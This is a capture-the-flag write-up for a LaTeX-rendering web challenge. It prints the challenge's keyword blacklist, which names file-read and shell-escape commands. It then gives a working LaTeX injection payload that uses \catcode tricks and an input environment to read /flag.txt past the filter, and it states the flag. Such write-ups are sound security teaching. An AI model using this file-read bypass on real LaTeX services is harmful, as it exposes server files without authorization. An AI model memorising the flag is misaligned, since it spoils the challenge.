# Latex

## Description

> My first LaTeX website for my math teacher. I hope this will become the best gift for him! :)
>
> <http://ctf.tcp1p.com:52132>
>
> Attachment: dist.zip

## Flag

TCP1P{bypassing_latex_waf_require_some_latex_knowledge}

## Solution

```go
blacklist = [] string {
    "\\input", "include", "newread", "openin", "file", "read", "closein",
    "usepackage", "fileline", "verbatiminput", "url", "href", "text", "write",
    "newwrite", "outfile", "closeout", "immediate", "|", "write18", "includegraphics",
    "openout", "newcommand", "expandafter", "csname", "endcsname", "^^"
}
```

It is required to bypass to the above black list.
It seems that I can take advantage of `\input` instead of `input`.

This solution is based on using `\begin{input}{/file/path}\end{input}` and `\catcode`.
Since `{`, `}` and `_` in the flag are interpreted as Latex, I temporarily replace them by using `\catcode`.

payload:

```latex
\documentclass{article}
\begin{document}

\catcode `\{=12
\catcode `\}=12
\catcode `\_=12

\catcode `\[=1
\catcode `\]=2

\begin[input]
[/flag.txt]
\end[input]

\catcode `\{=1
\catcode `\}=2

\end{document}
```

output is `TCP1P–bypassing˙latex˙waf˙require˙some˙latex˙knowledge˝` so replace each char:

- `–` to `{`
- `˝` to `}`
- `˙` to `_`

then got flag.

FYI: [official writeup](https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/tree/main/Web/Latex/writeup) is based on using `\begin...\end`, and register token by using `\newtoks` then built string by using `\the`.

<https://en.wikibooks.org/wiki/LaTeX/Plain_TeX>

> A token is a character, a control sequence, or a group.

## References

- <https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#lfi>
- <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection>
- <https://0day.work/hacking-with-latex/>
- <https://hovav.net/ucsd/dist/texhack.pdf>
  > For example, one can read files with \begin{input}{/file/path}\end{input}.
- <https://en.wikibooks.org/wiki/TeX/catcode>
